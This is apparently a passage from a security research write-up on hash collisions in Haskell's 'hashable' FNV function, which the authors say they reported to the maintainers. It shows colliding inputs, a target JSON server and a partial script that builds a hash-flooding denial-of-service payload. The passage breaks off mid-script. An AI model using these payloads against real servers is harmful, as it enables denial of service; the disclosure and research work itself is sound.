  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main <span class="op">()</span> <span class="op">{</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;0x</span><span class="sc">%lx\n</span><span class="st">&quot;</span><span class="op">,</span> hashable_fnv_hash<span class="op">((</span><span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*)</span> <span class="st">&quot;48321104917634386617&quot;</span><span class="op">,</span> <span class="dv">20</span><span class="op">,</span> <span class="bn">0xdc36d1615b7400a4</span><span class="op">));</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;0x</span><span class="sc">%lx\n</span><span class="st">&quot;</span><span class="op">,</span> hashable_fnv_hash<span class="op">((</span><span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*)</span> <span class="st">&quot;66392526131448240459&quot;</span><span class="op">,</span> <span class="dv">20</span><span class="op">,</span> <span class="bn">0xdc36d1615b7400a4</span><span class="op">));</span></span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;0x</span><span class="sc">%lx\n</span><span class="st">&quot;</span><span class="op">,</span> hashable_fnv_hash<span class="op">((</span><span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*)</span> <span class="st">&quot;17280429445395521746&quot;</span><span class="op">,</span> <span class="dv">20</span><span class="op">,</span> <span class="bn">0xdc36d1615b7400a4</span><span class="op">));</span></span>
<span id="5"><a href="#5" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;0x</span><span class="sc">%lx\n</span><span class="st">&quot;</span><span class="op">,</span> hashable_fnv_hash<span class="op">((</span><span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*)</span> <span class="st">&quot;79135381957515260764&quot;</span><span class="op">,</span> <span class="dv">20</span><span class="op">,</span> <span class="bn">0xdc36d1615b7400a4</span><span class="op">));</span></span>
<span id="6"><a href="#6" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;0x</span><span class="sc">%lx\n</span><span class="st">&quot;</span><span class="op">,</span> hashable_fnv_hash<span class="op">((</span><span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*)</span> <span class="st">&quot;44554690860062237799&quot;</span><span class="op">,</span> <span class="dv">20</span><span class="op">,</span> <span class="bn">0xdc36d1615b7400a4</span><span class="op">));</span></span>
<span id="7"><a href="#7" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;0x</span><span class="sc">%lx\n</span><span class="st">&quot;</span><span class="op">,</span> hashable_fnv_hash<span class="op">((</span><span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*)</span> <span class="st">&quot;79612854652076048686&quot;</span><span class="op">,</span> <span class="dv">20</span><span class="op">,</span> <span class="bn">0xdc36d1615b7400a4</span><span class="op">));</span></span>
<span id="8"><a href="#8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="9"><a href="#9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div></div><p>We found actual collisions against the <a href="https://github.com/tibbe/hashable/tree/3311870d3448dd5adb4f47b5a8007fc2cd1ed2a0">hashable</a> hash function:</p><pre>$ gcc fnv.c
$ ./a.out
0x0
0x0
0x0
0x0
0x0
</pre><p>This seemed sufficient to warrant reporting to the <code>hashable</code> library maintainers. But we wanted to demonstrate a real exploit.</p><h3>Building an exploit</h3><p>To construct an exploit, we were going to need a lot of these collisions. We knew that would take some time, so we started there.</p><h4>Finding many collisions.</h4><p>We launched an AWS <code>m5.24xlarge</code> spot instance that has 96 cores. We copied over the modified fnv-collider code with rsync, installed <code>rustc</code> and set it running with <code>n = 20</code>.</p><p>We found a few collisions quickly, saved them, and set the collision generator running again with <code>let n = 21</code>. We did that until <code>let n = 25</code>, which is where the machine ran out of its 384 GiB of memory. The entire operation cost us a few dollars (single-digit) and took about three hours.</p><p>In the meantime we started constructing an attack.</p><h4>Constructing an attack on a JSON web server.</h4><p>We made a minimal Haskell web server that would parse a JSON object and respond with <code>Complete</code>:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="pp">#!/usr/bin/env stack</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a><span class="co">-- stack --resolver lts-11.10 script --optimize</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a><span class="ot">{-# LANGUAGE NoImplicitPrelude #-}</span></span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a><span class="ot">{-# LANGUAGE OverloadedStrings #-}</span></span>
<span id="5"><a href="#5" aria-hidden="true" tabindex="-1"></a></span>
<span id="6"><a href="#6" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Conduit</span></span>
<span id="7"><a href="#7" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Data.Aeson</span> (fromEncoding, toEncoding)</span>
<span id="8"><a href="#8" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Data.Aeson.Parser</span> (json&#39;)</span>
<span id="9"><a href="#9" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Data.Conduit.Attoparsec</span> (sinkParser)</span>
<span id="10"><a href="#10" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Network.HTTP.Types</span></span>
<span id="11"><a href="#11" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Network.Wai</span></span>
<span id="12"><a href="#12" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Network.Wai.Conduit</span></span>
<span id="13"><a href="#13" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Network.Wai.Handler.Warp</span></span>
<span id="14"><a href="#14" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">RIO</span></span>
<span id="15"><a href="#15" aria-hidden="true" tabindex="-1"></a></span>
<span id="16"><a href="#16" aria-hidden="true" tabindex="-1"></a><span class="ot">main ::</span> <span class="dt">IO</span> ()</span>
<span id="17"><a href="#17" aria-hidden="true" tabindex="-1"></a>main <span class="ot">=</span></span>
<span id="18"><a href="#18" aria-hidden="true" tabindex="-1"></a>    run <span class="dv">3000</span> <span class="op">$</span> \req respond <span class="ot">-&gt;</span> <span class="kw">do</span></span>
<span id="19"><a href="#19" aria-hidden="true" tabindex="-1"></a>        void <span class="op">$</span> runConduit <span class="op">$</span> sourceRequestBody req <span class="op">.|</span> sinkParser json&#39;</span>
<span id="20"><a href="#20" aria-hidden="true" tabindex="-1"></a>        respond <span class="op">$</span> responseBuilder status200 [] <span class="st">&quot;Complete\n&quot;</span></span></code></pre></div></div><p>This server can be run with <code>./Server.hs</code>.</p><h4>Constructing a malicious JSON Object</h4><p>Next, we had to write a little piece of code that would take a file of newline-separated colliding strings, and turn it into a malicious JSON object.</p><p>We will create a JSON object that has many key-value pairs where every key is a text value with hash <code>0</code>, and every value is as small as possible. For the values, we chose <code>0</code> because it only requires a single byte. The resulting value will look something like the following.</p><pre>{&quot;collision1&quot;:0,&quot;collision2&quot;:0,...}
</pre><h5>Colliding <code>Text</code> values</h5><p>To make colliding <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a> values from the colliding strings, we have to reconsider how <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a> values are hashed:</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="kw">instance</span> <span class="dt">Hashable</span> <span class="dt">T.Text</span> <span class="kw">where</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a>    hashWithSalt salt (<span class="dt">T.Text</span> arr off len) <span class="ot">=</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a>        hashByteArrayWithSalt (TA.aBA arr) (off <span class="ot">`shiftL`</span> <span class="dv">1</span>) (len <span class="ot">`shiftL`</span> <span class="dv">1</span>)</span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a>        salt</span></code></pre></div></div><p>The raw bytes contained in the <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a> value are hashed as-is. The <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a> type <a href="https://hackage.haskell.org/package/text-1.2.3.0/docs/Data-Text-Foreign.html#g:1">stores a string of unicode characters in UTF-16 using the platform&#39;s native endianness</a>. That means that just using <a href="https://github.com/haskell/text/blob/9fac5db9b048b7d68fa2fb68513ba86c791b3630/Data/Text.hs#L451-L454"><code>Data.Text.pack</code></a> on the collision strings will not produce colliding text values.</p><p>We need to produce a text value, such that the UTF-16 encoding of the <code>String</code> that it represents is the given collision string. The way to do this, is to decode the given string using <a href="https://github.com/haskell/text/blob/9fac5db9b048b7d68fa2fb68513ba86c791b3630/Data/Text/Encoding.hs#L451-L458"><code>Data.Text.Encoding.decodeUtf16LE</code></a>.</p><p>Note that this can only ever succeed for even-length strings. For strings of odd lengths, we can just add an arbitrary byte to the end of the string. This works because of the fact that the output hash is the last state of the hashing process. If two values cause the same &#39;last state&#39;, then adding one more round using one more character will produce the same hash. Note that this adding of byte will probably change the hash value. However, if we use a zero byte, then the last round of the hashing process will multiply the hash (<code>0</code>) with the prime constant, and XOR the result with the zero-byte to produce <code>0</code> as the hash again.</p><h5>Extending colliding <code>Text</code> values</h5><p>Given any <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a> value that hashes to zero, we can produce arbitrarily many more <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a> values that hash to zero by extending it using the above process.</p><p>Note that extending a <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a> value with a zero-byte does use more space, so it may not be feasible to use only extended <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a> values in an attack. For this reason, we collect as many colliding <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a> values as we can and extend them only if we need even more of them and can afford using more space.</p><p><b>NOTE</b> Haskell web servers which consume JSON and do not place a limit on the request body size would be even more susceptible to a key-extension attack. However, this case is uninteresting, since such servers are already susceptible to a memory-exhaustion attack. Our goal in this attack is to maximise the number of keys that will fit into the arbitrary request body size limit.</p><h5>Creating a JSON <code>ByteString</code></h5><p>At this point, all that is left before creating the JSON <code>ByteString</code> is to put the right separating characters around the colliding <a href="https://github.com/haskell/text/blob/master/Data/Text/Internal.hs#L59-L64"><code>Data.Text.Text</code></a> objects. Note that it is highly inefficient to construct a JSON <code>ByteString</code> using <code>aeson</code> via a <a href="https://github.com/bos/aeson/blob/master/Data/Aeson/Types/Internal.hs#L345"><code>Data.Aeson.Value</code></a> because then we would be attacking ourselves.</p><h5>Non-problematic problem</h5><p>We also generate a JSON Object that contains non-colliding strings, just to make sure we that we have a value to check the difference against.</p><h5>Completed Construction</h5><p>The completed construction script looks as follows.</p><div style="pre &gt; code.sourceCode { white-space: pre; position: relative; }
pre &gt; code.sourceCode &gt; span { line-height: 1.25; }
pre &gt; code.sourceCode &gt; span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode &gt; span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre &gt; code.sourceCode { white-space: pre-wrap; }
pre &gt; code.sourceCode &gt; span { display: inline-block; text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code &gt; span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code &gt; span &gt; a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    background-color: #2a211c;
    color: #bdae9d;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #bdae9d;  padding-left: 4px; }
div.sourceCode
  { color: #bdae9d; background-color: #2a211c; }
@media screen {
pre &gt; code.sourceCode &gt; span &gt; a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffff00; } /* Alert */
code span.an { color: #0066ff; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #44aa43; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #43a8ed; font-weight: bold; } /* ControlFlow */
code span.ch { color: #049b0a; } /* Char */
code span.cn { } /* Constant */
code span.co { color: #0066ff; font-weight: bold; font-style: italic; } /* Comment */
code span.do { color: #0066ff; font-style: italic; } /* Documentation */
code span.dt { text-decoration: underline; } /* DataType */
code span.dv { color: #44aa43; } /* DecVal */
code span.er { color: #ffff00; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #44aa43; } /* Float */
code span.fu { color: #ff9358; font-weight: bold; } /* Function */
code span.im { } /* Import */
code span.in { color: #0066ff; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #43a8ed; font-weight: bold; } /* Keyword */
code span.op { } /* Operator */
code span.pp { font-weight: bold; } /* Preprocessor */
code span.sc { color: #049b0a; } /* SpecialChar */
code span.ss { color: #049b0a; } /* SpecialString */
code span.st { color: #049b0a; } /* String */
code span.va { } /* Variable */
code span.vs { color: #049b0a; } /* VerbatimString */
code span.wa { color: #ffff00; font-weight: bold; } /* Warning */
"><div class="sourceCode"><pre class="sourceCode"><code class="sourceCode"><span id="1"><a href="#1" aria-hidden="true" tabindex="-1"></a><span class="pp">#!/usr/bin/env stack</span></span>
<span id="2"><a href="#2" aria-hidden="true" tabindex="-1"></a><span class="co">-- stack --resolver lts-11.10 script</span></span>
<span id="3"><a href="#3" aria-hidden="true" tabindex="-1"></a><span class="ot">{-# LANGUAGE OverloadedStrings, NoImplicitPrelude #-}</span></span>
<span id="4"><a href="#4" aria-hidden="true" tabindex="-1"></a></span>
<span id="5"><a href="#5" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Control.Monad</span> (replicateM)</span>
<span id="6"><a href="#6" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Data.Aeson</span></span>
<span id="7"><a href="#7" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="kw">qualified</span> <span class="dt">Data.ByteString.Char8</span> <span class="kw">as</span> <span class="dt">B</span></span>
<span id="8"><a href="#8" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="kw">qualified</span> <span class="dt">Data.ByteString.Lazy</span> <span class="kw">as</span> <span class="dt">L</span></span>
<span id="9"><a href="#9" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="kw">qualified</span> <span class="dt">Data.HashMap.Strict</span> <span class="kw">as</span> <span class="dt">HM</span></span>
<span id="10"><a href="#10" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Data.Hashable</span> (hash)</span>
<span id="11"><a href="#11" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Data.List</span> (intersperse)</span>
<span id="12"><a href="#12" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="kw">qualified</span> <span class="dt">Data.Text</span> <span class="kw">as</span> <span class="dt">T</span></span>
<span id="13"><a href="#13" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Data.Text.Encoding</span></span>
<span id="14"><a href="#14" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">Prelude</span> (print)</span>
<span id="15"><a href="#15" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">RIO</span></span>
<span id="16"><a href="#16" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">System.Environment</span> (getArgs)</span>
<span id="17"><a href="#17" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="dt">System.Exit</span> (die)</span>
<span id="18"><a href="#18" aria-hidden="true" tabindex="-1"></a></span>
<span id="19"><a href="#19" aria-hidden="true" tabindex="-1"></a><span class="ot">main ::</span> <span class="dt">IO</span> ()</span>
<span id="20"><a href="#20" aria-hidden="true" tabindex="-1"></a>main <span class="ot">=</span> <span class="kw">do</span></span>
<span id="21"><a href="#21" aria-hidden="true" tabindex="-1"></a>    args <span class="ot">&lt;-</span> getArgs</span>
<span id="22"><a href="#22" aria-hidden="true" tabindex="-1"></a>    arg <span class="ot">&lt;-</span></span>
<span id="23"><a href="#23" aria-hidden="true" tabindex="-1"></a>        <span class="kw">case</span> args <span class="kw">of</span></span>
<span id="24"><a href="#24" aria-hidden="true" tabindex="-1"></a>            [] <span class="ot">-&gt;</span> die <span class="st">&quot;Supply the file with colliding strings as an argument&quot;</span></span>
<span id="25"><a href="#25" aria-hidden="true" tabindex="-1"></a>            (a<span class="op">:</span>_) <span class="ot">-&gt;</span> <span class="fu">pure</span> a</span>
<span id="26"><a href="#26" aria-hidden="true" tabindex="-1"></a>    bs <span class="ot">&lt;-</span> B.readFile arg</span>
<span id="27"><a href="#27" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> ls <span class="ot">=</span> <span class="fu">filter</span> (<span class="fu">not</span> <span class="op">.</span> B.null) <span class="op">$</span> B.lines bs</span>
<span id="28"><a href="#28" aria-hidden="true" tabindex="-1"></a>    texts&#39; <span class="ot">&lt;-</span></span>
<span id="29"><a href="#29" aria-hidden="true" tabindex="-1"></a>        <span class="fu">fmap</span> catMaybes <span class="op">$</span></span>
<span id="30"><a href="#30" aria-hidden="true" tabindex="-1"></a>        forM ls <span class="op">$</span> \l&#39; <span class="ot">-&gt;</span> <span class="kw">do</span></span>
<span id="31"><a href="#31" aria-hidden="true" tabindex="-1"></a>            <span class="kw">let</span> l <span class="ot">=</span></span>
<span id="32"><a href="#32" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">if</span> <span class="fu">even</span> (B.length l&#39;)</span>
<span id="33"><a href="#33" aria-hidden="true" tabindex="-1"></a>                        <span class="kw">then</span> l&#39;</span>
<span id="34"><a href="#34" aria-hidden="true" tabindex="-1"></a>                        <span class="kw">else</span> l&#39; <span class="op">&lt;&gt;</span> <span class="st">&quot;\0&quot;</span></span>
<span id="35"><a href="#35" aria-hidden="true" tabindex="-1"></a>            res <span class="ot">&lt;-</span> tryAnyDeep <span class="op">$</span> <span class="fu">return</span> <span class="op">$</span> decodeUtf16LE (<span class="ot">l ::</span> <span class="dt">B.ByteString</span>)</span>
<span id="36"><a href="#36" aria-hidden="true" tabindex="-1"></a>            <span class="kw">case</span> res <span class="kw">of</span></span>
<span id="37"><a href="#37" aria-hidden="true" tabindex="-1"></a>                <span class="dt">Left</span> e <span class="ot">-&gt;</span> <span class="fu">error</span> <span class="op">$</span> <span class="fu">show</span> (l, e)</span>
<span id="38"><a href="#38" aria-hidden="true" tabindex="-1"></a>                <span class="dt">Right</span> x <span class="ot">-&gt;</span> <span class="fu">return</span> <span class="op">$</span> <span class="dt">Just</span> x</span>
<span id="39"><a href="#39" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> texts <span class="ot">=</span> <span class="fu">concatMap</span> extend texts&#39;</span>
<span id="40"><a href="#40" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> obj <span class="ot">=</span> <span class="dt">Object</span> <span class="op">$</span> HM.fromList <span class="op">$</span> <span class="fu">map</span> (\t <span class="ot">-&gt;</span> (t, <span class="dt">Number</span> <span class="dv">0</span>)) texts</span>
<span id="41"><a href="#41" aria-hidden="true" tabindex="-1"></a>    <span class="fu">print</span> <span class="op">$</span> <span class="fu">length</span> texts</span>
<span id="42"><a href="#42" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> hashes <span class="ot">=</span> <span class="fu">map</span> hash texts</span>
<span id="43"><a href="#43" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> randoms <span class="ot">=</span></span>
<span id="44"><a href="#44" aria-hidden="true" tabindex="-1"></a>            <span class="fu">take</span> (<span class="dv">2</span> <span class="op">*</span> <span class="fu">length</span> texts) <span class="op">$</span> <span class="fu">map</span> T.pack <span class="op">$</span> replicateM <span class="dv">20</span> [<span class="ch">&#39;A&#39;</span> <span class="op">..</span> <span class="ch">&#39;Z&#39;</span>]</span>
<span id="45"><a href="#45" aria-hidden="true" tabindex="-1"></a>    <span class="fu">print</span> <span class="op">$</span> HM.fromListWith (<span class="op">+</span>) <span class="op">$</span> <span class="fu">map</span> (\h <span class="ot">-&gt;</span> (h, <span class="dv">1</span>)) hashes</span>
<span id="46"><a href="#46" aria-hidden="true" tabindex="-1"></a>    withBinaryFile <span class="st">&quot;collide.json&quot;</span> <span class="dt">WriteMode</span> <span class="op">$</span> \h <span class="ot">-&gt;</span></span>
<span id="47"><a href="#47" aria-hidden="true" tabindex="-1"></a>        hPutBuilder h <span class="op">$</span> buildJSON texts</span>
<span id="48"><a href="#48" aria-hidden="true" tabindex="-1"></a>    withBinaryFile <span class="st">&quot;no-collide.json&quot;</span> <span class="dt">WriteMode</span> <span class="op">$</span> \h <span class="ot">-&gt;</span></span>
<span id="49"><a href="#49" aria-hidden="true" tabindex="-1"></a>        hPutBuilder h <span class="op">$</span> buildJSON randoms</span>
<span id="50"><a href="#50" aria-hidden="true" tabindex="-1"></a></span>
<span id="51"><a href="#51" aria-hidden="true" tabindex="-1"></a><span class="ot">extend ::</span> <span class="dt">T.Text</span> <span class="ot">-&gt;</span> [<span class="dt">T.Text</span>]</span>
<span id="52"><a href="#52" aria-hidden="true" tabindex="-1"></a>extend text <span class="ot">=</span> <span class="fu">map</span> foo [<span class="dv">0</span> <span class="op">..</span> <span class="dv">3</span>]</span>
<span id="53"><a href="#53" aria-hidden="true" tabindex="-1"></a>  <span class="kw">where</span></span>
<span id="54"><a href="#54" aria-hidden="true" tabindex="-1"></a>    foo len <span class="ot">=</span> T.append text <span class="op">$</span> T.replicate len <span class="st">&quot;\0&quot;</span></span>
<span id="55"><a href="#55" aria-hidden="true" tabindex="-1"></a></span>
<span id="56"><a href="#56" aria-hidden="true" tabindex="-1"></a><span class="ot">buildJSON ::</span> [<span class="dt">T.Text</span>] <span class="ot">-&gt;</span> <span class="dt">Builder</span></span>
